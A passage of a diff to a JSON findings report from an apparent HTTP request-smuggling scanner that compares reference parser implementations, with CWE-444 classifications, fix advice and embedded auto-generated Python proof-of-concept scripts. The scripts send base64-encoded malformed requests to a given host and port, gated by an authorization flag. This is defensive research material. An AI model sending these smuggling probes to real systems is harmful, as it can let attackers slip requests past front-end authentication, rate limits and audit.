None。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = measure()\n    ok = got is not None\n    if got is None:\n        print(\"量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == tuple(EXPECT)\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
       "file_name": "poc_2204c027.py"
     },
     {
@@ -651,13 +951,28 @@
       "left": "ref-cl-first",
       "right": "ref-loose-request-line",
       "axis": "request_line",
+      "domain": "http1-framing",
       "impact": "前置与后端对『这条请求到哪里结束』判断不同：前置转发的字节里，后端只消费了一部分，剩下的成为后端眼中**下一条请求**的开头。于是攻击者可以在前置完全看不见的情况下，向后端注入一条自选请求 —— 前置的鉴权、限流、审计对这条被夹带的请求全部失效。",
       "fix": "对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式",
       "evidence": "把请求行规范化成 `POST / HTTP/1.1` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "chain_desc": "若 **ref-cl-first → ref-loose-request-line** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
-      "forwarded": 0,
-      "back_consumed": 0,
-      "smuggled_len": 0,
+      "quant": {
+        "label": "被夹带字节数",
+        "describe": "若 **ref-cl-first → ref-loose-request-line** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
+        "values": {
+          "front": "ref-cl-first",
+          "back": "ref-loose-request-line",
+          "forwarded": "0",
+          "back_consumed": "0",
+          "smuggled": "0"
+        },
+        "numbers": [
+          0,
+          0,
+          0
+        ],
+        "verified": true
+      },
       "verified": true,
       "original_len": 94,
       "sample_len": 58,
@@ -670,7 +985,7 @@
         "紧随其后的下一条请求会被拼接在那 0 字节之后，被夹带的字节成为后端眼中另一条请求的开头",
         "修复：对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式"
       ],
-      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 f2b69e5e，场景 desync。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_f2b69e5e.py                      # 离线：算清字节归属（默认，不联网）\n    python poc_f2b69e5e.py --send 127.0.0.1:8080 --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference                      # noqa: E402\nfrom ced.orchestrate.chain import chain_evidence     # noqa: E402\n\nCASE_ID = 'f2b69e5e'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-request-line'\nPAYLOAD = base64.b64decode('UE9TVCAgaHR0cDovL2xvY2FsaG9zdC8gSFRUUC8xLjENCkNvbnRlbnQtTGVuZ3RoOiAzDQoNCmFiYw==')\nEXPECT = (0, 0, 0)\n\n\ndef accounting() -> tuple[int, int, int] | None:\n    \"\"\"用两侧的分帧策略算出：前置转发多少 / 后端消费多少 / 夹带多少。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = accounting()\n    if got is None:\n        print(\"字节归属    无法量化（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == EXPECT\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n            if not ok:\n                print(\"说明        期望值来自生成时的实现；不一致说明复现条件已变，\")\n                print(\"            请重新跑一次 scan 生成新的 PoC，而不是改期望值。\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n        print(\"提示        走私的效果要看**下一条请求**，单次发送看不到；\"\n              \"请在后端日志或探针视角里确认被夹带的字节。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 f2b69e5e，场景 desync，领域 http1-framing。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_f2b69e5e.py                      # 离线：算清量化指标（默认，不联网）\n    python poc_f2b69e5e.py --send HOST:PORT --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference\nfrom ced.orchestrate.chain import chain_evidence\n\nCASE_ID = 'f2b69e5e'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-request-line'\nPAYLOAD = base64.b64decode('UE9TVCAgaHR0cDovL2xvY2FsaG9zdC8gSFRUUC8xLjENCkNvbnRlbnQtTGVuZ3RoOiAzDQoNCmFiYw==')\nEXPECT = (0, 0, 0)\n\n\ndef measure():\n    \"\"\"按两侧的策略算出量化指标。算不出来返回 None。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = measure()\n    ok = got is not None\n    if got is None:\n        print(\"量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == tuple(EXPECT)\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
       "file_name": "poc_f2b69e5e.py"
     },
     {
@@ -682,13 +997,28 @@
       "left": "ref-cl-first",
       "right": "ref-loose-request-line",
       "axis": "request_line",
+      "domain": "http1-framing",
       "impact": "前置与后端对『这条请求到哪里结束』判断不同：前置转发的字节里，后端只消费了一部分，剩下的成为后端眼中**下一条请求**的开头。于是攻击者可以在前置完全看不见的情况下，向后端注入一条自选请求 —— 前置的鉴权、限流、审计对这条被夹带的请求全部失效。",
       "fix": "对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式",
       "evidence": "把请求行规范化成 `POST / HTTP/1.1` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "chain_desc": "若 **ref-cl-first → ref-loose-request-line** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
-      "forwarded": 0,
-      "back_consumed": 0,
-      "smuggled_len": 0,
+      "quant": {
+        "label": "被夹带字节数",
+        "describe": "若 **ref-cl-first → ref-loose-request-line** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
+        "values": {
+          "front": "ref-cl-first",
+          "back": "ref-loose-request-line",
+          "forwarded": "0",
+          "back_consumed": "0",
+          "smuggled": "0"
+        },
+        "numbers": [
+          0,
+          0,
+          0
+        ],
+        "verified": true
+      },
       "verified": true,
       "original_len": 79,
       "sample_len": 62,
@@ -701,7 +1031,7 @@
         "紧随其后的下一条请求会被拼接在那 0 字节之后，被夹带的字节成为后端眼中另一条请求的开头",
         "修复：对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式"
       ],
-      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 7e6ac820，场景 desync。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_7e6ac820.py                      # 离线：算清字节归属（默认，不联网）\n    python poc_7e6ac820.py --send 127.0.0.1:8080 --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference                      # noqa: E402\nfrom ced.orchestrate.chain import chain_evidence     # noqa: E402\n\nCASE_ID = '7e6ac820'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-request-line'\nPAYLOAD = base64.b64decode('cG9zdCAvIEhUVFAvMS4xDQpUcmFuc2Zlci1FbmNvZGluZzogQ2h1bmtlZA0KDQo1DQpoZWxsbw0KMA0KDQo=')\nEXPECT = (0, 0, 0)\n\n\ndef accounting() -> tuple[int, int, int] | None:\n    \"\"\"用两侧的分帧策略算出：前置转发多少 / 后端消费多少 / 夹带多少。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = accounting()\n    if got is None:\n        print(\"字节归属    无法量化（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == EXPECT\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n            if not ok:\n                print(\"说明        期望值来自生成时的实现；不一致说明复现条件已变，\")\n                print(\"            请重新跑一次 scan 生成新的 PoC，而不是改期望值。\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n        print(\"提示        走私的效果要看**下一条请求**，单次发送看不到；\"\n              \"请在后端日志或探针视角里确认被夹带的字节。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 7e6ac820，场景 desync，领域 http1-framing。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_7e6ac820.py                      # 离线：算清量化指标（默认，不联网）\n    python poc_7e6ac820.py --send HOST:PORT --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference\nfrom ced.orchestrate.chain import chain_evidence\n\nCASE_ID = '7e6ac820'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-request-line'\nPAYLOAD = base64.b64decode('cG9zdCAvIEhUVFAvMS4xDQpUcmFuc2Zlci1FbmNvZGluZzogQ2h1bmtlZA0KDQo1DQpoZWxsbw0KMA0KDQo=')\nEXPECT = (0, 0, 0)\n\n\ndef measure():\n    \"\"\"按两侧的策略算出量化指标。算不出来返回 None。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = measure()\n    ok = got is not None\n    if got is None:\n        print(\"量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == tuple(EXPECT)\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
       "file_name": "poc_7e6ac820.py"
     }
   ],
@@ -713,7 +1043,7 @@
       "right": "ref-lenient-cl",
       "level": "security",
       "kind": "framing_boundary",
-      "reason": "消息边界解释分歧（字段 ['framing_source', 'cl', 'body_len', 'consumed', 'leftover_len']），且由攻击者可直接发送的部分（请求行/请求头）承载 → 具备请求走私的结构性前提",
+      "reason": "结构字段分歧（['framing_source', 'cl', 'body_len', 'consumed', 'leftover_len']），且消融实验证明它由攻击者可直接发送的字节承载 → 具备可升级为安全影响的结构性前提；具体后果与 CWE 见领域映射（CWE-444）",
       "controllable": true,
       "ablation": "移除请求头 `Content-Length: 03` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "cwe": "CWE-444",
@@ -791,7 +1121,7 @@
       "right": "ref-lenient-cl",
       "level": "unknown",
       "kind": "framing_boundary",
-      "reason": "消息边界解释分歧（字段 ['framing_source', 'cl', 'body_len', 'consumed', 'leftover_len']），但消融实验无法定位到单条可控头 → 需人工复核",
+      "reason": "结构字段分歧（['framing_source', 'cl', 'body_len', 'consumed', 'leftover_len']），但消融实验无法定位到单条可控承载者 → 需人工复核",
       "controllable": false,
       "ablation": null,
       "cwe": "CWE-444",
@@ -869,7 +1199,7 @@
       "right": "ref-lenient-cl",
       "level": "security",
       "kind": "framing_boundary",
-      "reason": "消息边界解释分歧（字段 ['framing_source', 'cl', 'body_len', 'consumed', 'leftover_len']），且由攻击者可直接发送的部分（请求行/请求头）承载 → 具备请求走私的结构性前提",
+      "reason": "结构字段分歧（['framing_source', 'cl', 'body_len', 'consumed', 'leftover_len']），且消融实验证明它由攻击者可直接发送的字节承载 → 具备可升级为安全影响的结构性前提；具体后果与 CWE 见领域映射（CWE-444）",
       "controllable": true,
       "ablation": "移除请求头 `Content-Length: +3` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "cwe": "CWE-444",
@@ -947,7 +1277,7 @@
       "right": "ref-lenient-cl",
       "level": "security",
       "kind": "framing_boundary",
-      "reason": "消息边界解释分歧（字段 ['framing_source', 'cl', 'body_len', 'consumed', 'leftover_len']），且由攻击者可直接发送的部分（请求行/请求头）承载 → 具备请求走私的结构性前提",
+      "reason": "结构字段分歧（['framing_source', 'cl', 'body_len', 'consumed', 'leftover_len']），且消融实验证明它由攻击者可直接发送的字节承载 → 具备可升级为安全影响的结构性前提；具体后果与 CWE 见领域映射（CWE-444）",
       "controllable": true,
       "ablation": "移除请求头 `Content-Length: 0000003` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "cwe": "CWE-444",
@@ -1025,7 +1355,7 @@
       "right": "ref-lenient-cl",
       "level": "security",
       "kind": "framing_boundary",
-      "reason": "消息边界解释分歧（字段 ['framing_source', 'cl', 'body_len', 'consumed', 'leftover_len']），且由攻击者可直接发送的部分（请求行/请求头）承载 → 具备请求走私的结构性前提",
+      "reason": "结构字段分歧（['framing_source', 'cl', 'body_len', 'consumed', 'leftover_len']），且消融实验证明它由攻击者可直接发送的字节承载 → 具备可升级为安全影响的结构性前提；具体后果与 CWE 见领域映射（CWE-444）",
       "controllable": true,
       "ablation": "移除请求头 `CONTENT-LENGTH: +3` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "cwe": "CWE-444",
@@ -1103,7 +1433,7 @@
       "right": "ref-lenient-cl",
       "level": "security",
       "kind": "framing_boundary",
-      "reason": "消息边界解释分歧（字段 ['accepted', 'status', 'framing_source', 'cl', 'body_len', 'consumed', 'leftover_len']），且由攻击者可直接发送的部分（请求行/请求头）承载 → 具备请求走私的结构性前提",
+      "reason": "结构字段分歧（['accepted', 'status', 'framing_source', 'cl', 'body_len', 'consumed', 'leftover_len']），且消融实验证明它由攻击者可直接发送的字节承载 → 具备可升级为安全影响的结构性前提；具体后果与 CWE 见领域映射（CWE-444）",
       "controllable": true,
       "ablation": "移除请求头 `Content-Length: 3`；移除请求头 `Content-Length: 4` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "cwe": "CWE-444",
@@ -1189,7 +1519,7 @@
       "right": "ref-lenient-cl",
       "level": "security",
       "kind": "framing_boundary",
-      "reason": "消息边界解释分歧（字段 ['accepted', 'status', 'framing_source', 'cl', 'body_len', 'consumed', 'leftover_len']），且由攻击者可直接发送的部分（请求行/请求头）承载 → 具备请求走私的结构性前提",
+      "reason": "结构字段分歧（['accepted', 'status', 'framing_source', 'cl', 'body_len', 'consumed', 'leftover_len']），且消融实验证明它由攻击者可直接发送的字节承载 → 具备可升级为安全影响的结构性前提；具体后果与 CWE 见领域映射（CWE-444）",
       "controllable": true,
       "ablation": "移除请求头 `CONTENT-LENGTH: 3`；移除请求头 `Content-Length: 4` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "cwe": "CWE-444",
@@ -1275,7 +1605,7 @@
       "right": "ref-lenient-cl",
       "level": "security",
       "kind": "framing_boundary",
-      "reason": "消息边界解释分歧（字段 ['cl', 'body_len', 'consumed', 'leftover_len']），且由攻击者可直接发送的部分（请求行/请求头）承载 → 具备请求走私的结构性前提",
+      "reason": "结构字段分歧（['cl', 'body_len', 'consumed', 'leftover_len']），且消融实验证明它由攻击者可直接发送的字节承载 → 具备可升级为安全影响的结构性前提；具体后果与 CWE 见领域映射（CWE-444）",
       "controllable": true,
       "ablation": "移除请求头 `Content-Length: +3` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "cwe": "CWE-444",
@@ -1349,7 +1679,7 @@
       "right": "ref-loose-headers",
       "level": "security",
       "kind": "framing_boundary",
-      "reason": "消息边界解释分歧（字段 ['accepted', 'status', 'framing_source', 'consumed', 'leftover_len']），且由攻击者可直接发送的部分（请求行/请求头）承载 → 具备请求走私的结构性前提",
+      "reason": "结构字段分歧（['accepted', 'status', 'framing_source', 'consumed', 'leftover_len']），且消融实验证明它由攻击者可直接发送的字节承载 → 具备可升级为安全影响的结构性前提；具体后果与 CWE 见领域映射（CWE-444）",
       "controllable": true,
       "ablation": "移除请求头 `Host: localhost`；移除请求头 ` injected: fold` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "cwe": "CWE-444",
@@ -1427,7 +1757,7 @@
       "right": "ref-loose-headers",
       "level": "security",
       "kind": "framing_boundary",
-      "reason": "消息边界解释分歧（字段 ['accepted', 'status', 'framing_source', 'consumed', 'leftover_len']），且由攻击者可直接发送的部分（请求行/请求头）承载 → 具备请求走私的结构性前提",
+      "reason": "结构字段分歧（['accepted', 'status', 'framing_source', 'consumed', 'leftover_len']），且消融实验证明它由攻击者可直接发送的字节承载 → 具备可升级为安全影响的结构性前提；具体后果与 CWE 见领域映射（CWE-444）",
       "controllable": true,
       "ablation": "移除请求头 ` injected: fold` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "cwe": "CWE-444",
@@ -1505,7 +1835,7 @@
       "right": "ref-loose-headers",
       "level": "security",
       "kind": "framing_boundary",
-      "reason": "消息边界解释分歧（字段 ['accepted', 'status', 'framing_source', 'consumed', 'leftover_len']），且由攻击者可直接发送的部分（请求行/请求头）承载 → 具备请求走私的结构性前提",
+      "reason": "结构字段分歧（['accepted', 'status', 'framing_source', 'consumed', 'leftover_len']），且消融实验证明它由攻击者可直接发送的字节承载 → 具备可升级为安全影响的结构性前提；具体后果与 CWE 见领域映射（CWE-444）",
       "controllable": true,
       "ablation": "移除请求头 ` injected: fold` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "cwe": "CWE-444",
@@ -1583,7 +1913,7 @@
       "right": "ref-loose-headers",
       "level": "security",
       "kind": "framing_boundary",
-      "reason": "消息边界解释分歧（字段 ['accepted', 'status', 'framing_source', 'consumed', 'leftover_len']），且由攻击者可直接发送的部分（请求行/请求头）承载 → 具备请求走私的结构性前提",
+      "reason": "结构字段分歧（['accepted', 'status', 'framing_source', 'consumed', 'leftover_len']），且消融实验证明它由攻击者可直接发送的字节承载 → 具备可升级为安全影响的结构性前提；具体后果与 CWE 见领域映射（CWE-444）",
       "controllable": true,
       "ablation": "移除请求头 ` injected: fold` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "cwe": "CWE-444",
@@ -1661,7 +1991,7 @@
       "right": "ref-loose-request-line",
       "level": "security",
       "kind": "framing_boundary",
-      "reason": "消息边界解释分歧（字段 ['accepted', 'status', 'framing_source', 'cl', 'body_len', 'consumed']），且由攻击者可直接发送的部分（请求行/请求头）承载 → 具备请求走私的结构性前提",
+      "reason": "结构字段分歧（['accepted', 'status', 'framing_source', 'cl', 'body_len', 'consumed']），且消融实验证明它由攻击者可直接发送的字节承载 → 具备可升级为安全影响的结构性前提；具体后果与 CWE 见领域映射（CWE-444）",
       "controllable": true,
       "ablation": "把请求行规范化成 `POST / HTTP/1.1` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "cwe": "CWE-444",
@@ -1743,7 +2073,7 @@
       "right": "ref-loose-request-line",
       "level": "security",
       "kind": "framing_boundary",
-      "reason": "消息边界解释分歧（字段 ['accepted', 'status', 'framing_source', 'cl', 'body_len', 'consumed']），且由攻击者可直接发送的部分（请求行/请求头）承载 → 具备请求走私的结构性前提",
+      "reason": "结构字段分歧（['accepted', 'status', 'framing_source', 'cl', 'body_len', 'consumed']），且消融实验证明它由攻击者可直接发送的字节承载 → 具备可升级为安全影响的结构性前提；具体后果与 CWE 见领域映射（CWE-444）",
       "controllable": true,
       "ablation": "把请求行规范化成 `POST / HTTP/1.1` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "cwe": "CWE-444",
@@ -1825,7 +2155,7 @@
       "right": "ref-loose-request-line",
       "level": "security",
       "kind": "framing_boundary",
